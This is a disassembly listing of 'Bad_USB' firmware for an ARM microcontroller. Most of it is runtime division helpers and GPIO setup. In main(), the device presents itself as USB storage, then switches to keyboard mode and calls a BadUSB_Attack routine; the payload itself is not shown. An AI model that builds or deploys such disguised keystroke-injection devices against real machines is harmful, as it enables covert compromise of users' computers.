
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000d0ac  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000234  0800d238  0800d238  0001d238  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d46c  0800d46c  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d46c  0800d46c  0001d46c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d474  0800d474  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d474  0800d474  0001d474  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d478  0800d478  0001d478  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d47c  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d6bc  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d6bc  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020aaf  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 0000538c  00000000  00000000  00040d62  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b38  00000000  00000000  000460f0  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c7  00000000  00000000  00047c28  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  00026624  00000000  00000000  000490ef  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025b57  00000000  00000000  0006f713  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d24ba  00000000  00000000  0009526a  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f70  00000000  00000000  00167724  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e694  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d220 	.word	0x0800d220

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d220 	.word	0x0800d220

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fc44 	bl	8001dc8 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 facc 	bl	8001af4 <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 fabe 	bl	8001af4 <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fe8e 	bl	80012ae <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f85f 	bl	8000654 <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fdc5 	bl	8001128 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fc5d 	bl	8000e5c <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b27      	ldr	r3, [pc, #156]	; (8000644 <main+0xbc>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b fff6 	bl	800c59c <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	4824      	ldr	r0, [pc, #144]	; (8000648 <main+0xc0>)
 80005b6:	f00c fdf9 	bl	800d1ac <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	4823      	ldr	r0, [pc, #140]	; (800064c <main+0xc4>)
 80005c0:	f000 fa70 	bl	8000aa4 <InterruptTrap>
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 80005c4:	4b22      	ldr	r3, [pc, #136]	; (8000650 <main+0xc8>)
 80005c6:	691b      	ldr	r3, [r3, #16]
 80005c8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80005cc:	2b00      	cmp	r3, #0
 80005ce:	bf14      	ite	ne
 80005d0:	2301      	movne	r3, #1
 80005d2:	2300      	moveq	r3, #0
 80005d4:	b2db      	uxtb	r3, r3
 80005d6:	603b      	str	r3, [r7, #0]
	  switch(flag){
 80005d8:	687b      	ldr	r3, [r7, #4]
 80005da:	2b01      	cmp	r3, #1
 80005dc:	d003      	beq.n	80005e6 <main+0x5e>
 80005de:	687b      	ldr	r3, [r7, #4]
 80005e0:	2b02      	cmp	r3, #2
 80005e2:	d01c      	beq.n	800061e <main+0x96>
		  }
		  flag = 0;
		  SwitchToMSC();
		  break;
	  default:
		  break;
 80005e4:	e02c      	b.n	8000640 <main+0xb8>
		  HAL_Delay(10000);
 80005e6:	f242 7010 	movw	r0, #10000	; 0x2710
 80005ea:	f000 fed5 	bl	8001398 <HAL_Delay>
			  if(!Flash_Busy){
 80005ee:	683b      	ldr	r3, [r7, #0]
 80005f0:	2b00      	cmp	r3, #0
 80005f2:	d1fc      	bne.n	80005ee <main+0x66>
				  SwitchToHID();
 80005f4:	f000 f8a6 	bl	8000744 <SwitchToHID>
				  while(!TestHID())
 80005f8:	e003      	b.n	8000602 <main+0x7a>
					  HAL_Delay(TestHIDSlot);
 80005fa:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 80005fe:	f000 fecb 	bl	8001398 <HAL_Delay>
				  while(!TestHID())
 8000602:	f000 fa6d 	bl	8000ae0 <TestHID>
 8000606:	4603      	mov	r3, r0
 8000608:	2b00      	cmp	r3, #0
 800060a:	d0f6      	beq.n	80005fa <main+0x72>
				  BadUSB_Attack(0);
 800060c:	2000      	movs	r0, #0
 800060e:	f000 fa8f 	bl	8000b30 <BadUSB_Attack>
				  break;
 8000612:	bf00      	nop
		  flag = 2;
 8000614:	2302      	movs	r3, #2
 8000616:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000618:	f000 f8ac 	bl	8000774 <SwitchToMSC>
		  break;
 800061c:	e010      	b.n	8000640 <main+0xb8>
		  HAL_Delay(20000);
 800061e:	f644 6020 	movw	r0, #20000	; 0x4e20
 8000622:	f000 feb9 	bl	8001398 <HAL_Delay>
			  if(!Flash_Busy){
 8000626:	683b      	ldr	r3, [r7, #0]
 8000628:	2b00      	cmp	r3, #0
